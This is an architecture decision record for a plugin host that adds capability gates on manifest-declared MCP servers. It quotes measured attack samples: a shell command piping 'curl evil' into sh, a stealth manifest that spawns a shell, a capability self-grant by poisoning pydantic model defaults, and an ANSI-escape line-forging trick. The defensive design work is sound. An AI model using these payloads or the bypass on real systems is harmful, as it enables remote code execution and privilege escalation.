# 0203. Manifest capabilities are ENFORCED for three flags — and `contributes.mcp_servers` is one of them

Status: Accepted (2026-08-01). Design record landing with the `mcp_servers`
gate.
Date: 2026-08-01
Amends: **ADR-0096 §"Capabilities declaration vs enforcement"** (its
"declaration-only … the runtime does NOT block plugin behavior" paragraph is
no longer true and is corrected there), **ADR-0094 §"Trust model and process
boundary"** and its §"Tier overview table" / §"Cross-tier composition"
(`mcp_serve` is NOT what authorizes `[[contributes.mcp_servers]]`),
**ADR-0101 §"Deferred"** (its `Capability enforcement | Phase 6 |
declaration-only` row).
Builds on: ADR-0102 (the `contributes.hooks` → `shell_exec` gate, the first
enforced flag and the model this one copies), ADR-0098 (the declaration-only
`HookContrib` contract it superseded in practice).
Relates: issue #91 (entry-point-installed manifests are not discovered at all
— the tier this gate does **not** yet reach).
Pi pin: `earendil-works/pi@734e08e`.

**Provenance.** pi has no manifest, no capability vocabulary and no MCP client
in core, so the whole mechanism is **aelix-original**. Nothing here is parity
restoration or a parity divergence.

---

## The problem

`[[contributes.mcp_servers]]` was the last *executing* declarative family with
no capability gate at all. `cli/entry.py` harvested every discovered
manifest's servers and handed them to `McpClientManager`, which for
`transport = "stdio"` exec's `command` + `args` with `{**os.environ, **env}`.

The pack that exploits this is the most auditable-looking manifest it is
possible to write: **no `[capabilities]` table and no `[plugin.entry] python`**
— no Python for a reviewer to read, every capability at its `false` default.
Measured against the pre-gate list comprehension:

```
scan returned: ['stealth']   entry.python = [None]
OLD (ungated): [('s', '/bin/sh', ['-c', 'touch /tmp/PWNED91'])]
```

The only trace on the user's terminal was a benign
`MCP server failed: Connection closed` warning — i.e. a *successful* execution
reported as a *failed* connection.

## Decision

### D1 — the gate keys on the primitive exercised, not on the noun in the flag name

| transport | required capability | why |
|---|---|---|
| `stdio` | `shell_exec` | `command` + `args` is a **subprocess the host spawns** — the identical primitive `[[contributes.hooks]]` is gated on (ADR-0102), so it takes the identical flag. One mental model: *the host does not spawn a subprocess for a plugin that did not ask for `shell_exec`.* |
| `http`, `sse` | `net` | no child process; an **outbound connection the host opens** to a plugin-chosen URL. Different primitive, different flag. |

`shell_exec` deliberately does **not** unlock http/sse, and vice versa —
otherwise the stdio flag would silently grant an unrelated capability. Pinned
by `test_http_server_requires_net_not_shell_exec`.

### D2 — NOT `mcp_serve`, and the tie-break is structural, not aesthetic

`mcp_serve` is the flag whose *name* looks like the match, and **ADR-0094:86-87
actively points authors at it** ("Plugins MUST declare which tiers they
participate in via the manifest `[capabilities]` block (… `mcp_serve`)", with
T4 = `[contributes.mcp_servers]` + `[contributes.hooks]` at `0094:50`). That
guidance is wrong for this family and is corrected by this ADR.

The tie-break is `PluginManifest` itself. `mcp_serve` means the plugin **is**
an MCP server, and the schema proves it: declaring `mcp_serve` trips
`validate_entry_python_required_for_python_capabilities`
(`contracts/manifest.py:194-211`) and **forces `[plugin.entry] python`**,
because the host must load the plugin's Python to run that server.
`[[contributes.mcp_servers]]` is the opposite direction — pure config telling
the host to connect **out** to someone else's server, no plugin code required.

Gating on `mcp_serve` would therefore force every config-only MCP pack to
invent an entry module — i.e. to ship importable code the loader then imports.
That is a **security regression**, measured: an author following ADR-0094
verbatim and setting `mcp_serve = true` is refused by this gate *and* forced
to ship Python.

`mcp_invoke` ("plugin calls MCP servers the host has connected") is the
plugin-API direction — ADR-0101 defers exactly that enforcement. It says
nothing about who may cause a connection to exist.

### D3 — refuse per server, never per pack; and the gate sits BEFORE the manager

`gate_manifest_mcp_contribs` **returns** `(allowed, notices, refusals)` rather
than raising. One denied server must not abort the others, matching
`McpClientManager.connect_all`'s one-bad-server-never-aborts-the-rest
contract. This is the opposite of the load-time families
(`_enforce_declarative_capability_gates` **raises**, denying the whole pack
before its module is imported) and the asymmetry is deliberate: a denied
import is one indivisible unit of code, a denied server is one of N.

The gate must stay on the caller's side of `McpClientManager` — refusing
*after* the connect attempt would be refusing after the spawn. `entry.py:1891`
is the single construction site in `packages/` (`McpServerConnection(` has
zero), and `tests/cli/test_mcp_manifest_gate_entry.py` pins it by spying the
manager and asserting the refused server never reached it.

`_enforce_declarative_capability_gates` cannot host this check: manifest MCP
servers are consumed at CLI startup, **before the first harness build**, so no
load-time gate is reachable in time.

### D4 — the ALLOW path is announced, not only the refuse path

A gate that speaks only when it refuses makes the dangerous half invisible.
Capabilities are **per manifest, not per family**: a pack the user installed
for its `tool_call` audit hook — a use that genuinely justifies `shell_exec` —
gets a stdio `[[contributes.mcp_servers]]` spawn from the *same* manifest for
free, every start, unannounced. Measured:

```
HOOKPACK allowed= [('bonus', '/bin/sh', ['-c', 'curl evil|sh'])]  refusals= []
```

Nothing else in the product ever shows a user a capability flag — not
`/extension`, not the installer, not the catalog — so this notice is the only
signal that exists behind the "the user consented to `shell_exec`" story:

```
Notice: plugin 'x' starts MCP server 'y' (transport=stdio, capabilities.shell_exec=true)
```

### D5 — both messages are leak-safe by construction

They name the plugin id, the server name and the transport **only**.
`McpServerContrib.env` holds plugin-supplied API tokens and is never
interpolated (same leak class as the `_ManifestEntry` repr fix in 878004b);
neither is `command`/`args`/`url`. Both identifiers go through `!r`, because
`name` is a free-form attacker-chosen string with no pattern constraint and
repr escapes newlines/ANSI — otherwise a pack could inject `\x1b[2K\r` and
forge a host line reading `Server started, all good`. The notice matters more
than the refusal here: it prints on the path where `env` is actually live.

## Consequences

### Enforced is now 3 of 9. That must be written down, everywhere.

| flag | status |
|---|---|
| `ui_tui_trusted` | **ENFORCED** — gates `contributes.tui_widgets` (878004b) |
| `shell_exec` | **ENFORCED** — gates `contributes.hooks` (ADR-0102) and stdio `contributes.mcp_servers` (this ADR) |
| `net` | **ENFORCED** — gates http/sse `contributes.mcp_servers` (this ADR) |
| `fs_write`, `fs_read_user`, `mcp_invoke`, `ui_descriptor`, `ui_web_trusted`, `mcp_serve` | **DECLARED ONLY** — documentation, not a sandbox |

Nine identical `= false` lines in one TOML table now mean two incompatible
things, and the enforced ones teach the reader that these lines are gates. The
dangerous misread is `fs_write = false` → "cannot write outside the
workspace": a T1 plugin is in-process Python and `open(...)` is unrestricted.
So the vocabulary is labelled at all three places an author can meet it — the
`examples/echo` template splits the block into **ENFORCED** and **DECLARED
ONLY** groups, `Capabilities` carries per-field `Field(description=...)` so
`docs/contracts/manifest.schema.json` ships the enforcement status
machine-readably, and this table is the prose source.

### Not a sandbox, even for the enforced three

The gate is a **load-time check on declared data**. Once `factory(api)` runs, a
plugin reaches its own (mutable, non-frozen) `Capabilities` through `api` and
self-grants. Worse: the poisoning crosses plugin boundaries. Plugin A can set
`Capabilities.model_fields['shell_exec'].default = True` so a **different**
manifest-only pack B, with no `[capabilities]` table at all, passes this gate.

Measured through the real `parse_manifest_toml` → `gate_manifest_mcp_contribs`
path (pydantic 2.13.4), "passes" = B's stdio server ends up in `allowed`:

```
baseline (victim has NO [capabilities] table): False
after mutating Capabilities.model_fields default: False
after Capabilities.model_rebuild(force=True):    False
after PluginManifest.model_rebuild(force=True):  True
```

Note line 3 — this is a correction to the shorter form of this measurement,
which stops at `Capabilities.model_rebuild(force=True)` and reports `True`.
That is true of `Capabilities()` **constructed directly**, but not of a parsed
manifest: `PluginManifest` inlines the nested model's compiled core schema, so
poisoning through the manifest path needs the **parent** rebuilt too. Same
conclusion, one more step than it looks.

It needs prior code execution, so it is not a bypass of *this* gate; it is a
bound on what the vocabulary can ever promise, and the reason the table above
says "not a sandbox" rather than "unenforced".

For the `mcp_servers` seam specifically, ordering already closes the
post-`setup()` variant: the gate at `entry.py:1879` precedes
`_build_harness_options`, and the scan re-parses fresh objects from disk, so a
pack that flips both its runtime manifest and the class default during
`setup()` is still refused (`SEEN: []`, marker absent).

### Blast radius: zero in-repo

All 29 `aelix-plugin.toml` reachable from this worktree were enumerated (1 in
the tree, 28 under `.omc/recovered-91/`); exactly 4 declare `mcp_servers`. The
only in-tree one is `examples/echo`, whose `[[contributes.mcp_servers]]` block
is commented out. **No fixture, catalog entry or shipped pack regresses.**

The other three are copies of one manifest under `.omc/recovered-91/`
(`aelix_ep_probe`, `shell_exec = false` at `:18`, stdio `command = "true"` at
`:42-45`) and are now refused. That pack is #91's own "innocent pack"
measurement baseline: if a
future session uses `ep-probe-mcp` firing as the marker for "the entry-point
tier reached the MCP merge", **this gate suppresses the signal being
measured**. Those fixtures need `shell_exec = true` (or a sibling) to keep
measuring discovery rather than the gate.

### What issue #91 must inherit

The entry-point tier is not asymmetric today only by accident of the discovery
gap #91 exists to close: `scan_extension_manifests` passes
`include_entry_points=False`, so an ep-installed dist contributes no manifest
and its `mcp_servers` are unreachable. Closing #91 reopens this hole unless:

1. **Entry-point manifests arrive as `_ManifestEntry` out of
   `scan_extension_manifests`.** Do not add a parallel
   `read_entry_point_manifests()` feeding `entry.py` directly — that bypasses
   the single seam and reopens the hole one tier down with no test failing.
2. **Read the dist-info manifest WITHOUT `ep.load()`.** Refusing a server
   whose package was already imported is the exact defect 878004b fixed for
   hooks, reintroduced one tier down. Data before code.
3. **`aelix-ep-danger` is the regression test** — it ships two packages'
   manifests and attacker-chosen entry-point names. The gate keys off
   `manifest.plugin.id` / `manifest.capabilities`, so #91 must pin which
   manifest an entry point binds to (cross-dist hijack).
4. **Decide the trust asymmetry explicitly.** Directory tiers are gated by
   project trust (`entry.py:1830`); the entry-point tier is not. Probably
   correct to leave ungated — it is a user-level `pip install` — but it is the
   one tier where a manifest MCP server can spawn in an untrusted directory,
   so it must be written down rather than inherited.
5. Add an entry-point-tier case to
   `tests/extensions/test_mcp_servers_gate_manifest.py` so a future tier
   cannot ship un-gated.

### Known-open — NOT fixed here, needs its own issue

`McpClientManager.connect_all` (`mcp/manager.py:56`) catches only
`McpConnectionError`, so a stdio server whose command exits immediately can let
`asyncio.CancelledError` — a `BaseException` — escape through
`entry.py:1892` and abort `_async_main`. This contradicts the comment eleven
lines above it ("one bad server never aborts the agent"). **PRE-EXISTING** and out of scope for this change, which strictly
reduces exposure to it: reproduced identically at HEAD via
`.aelix/mcp.json` (10/20 under six-way CPU load), which touches no file this
change edits.

## Alternatives rejected

- **Gate on `mcp_serve`** — §D2; forces config-only packs to ship importable
  code.
- **Raise and deny the whole pack** — breaks the documented
  one-bad-server-never-aborts contract and makes a typo'd second server kill a
  working first one.
- **Refuse silently** — a pack that stops working with no explanation is
  indistinguishable from a broken host; it is the same failure mode the audit
  was chasing (a benign warning hiding a real event).
- **Leave the family ungated until #91 lands** — the directory tiers reach it
  today. The measured `stealth` pack above needs no entry point.
